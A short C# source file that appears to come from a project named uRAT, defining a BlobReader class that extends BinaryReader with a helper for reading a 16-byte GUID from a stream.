using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;

namespace uRAT.Client.Tools.Blob
{
    class BlobReader : BinaryReader
    {
        public BlobReader(Stream input) 
            : base(input)
        {
        }

        public BlobReader(Stream input, Encoding encoding) 
            : base(input, encoding)
        {
        }

        public Guid ReadGuid()
        {
            var buff = ReadBytes(16);
            return new Guid(buff);
        }
    }
}
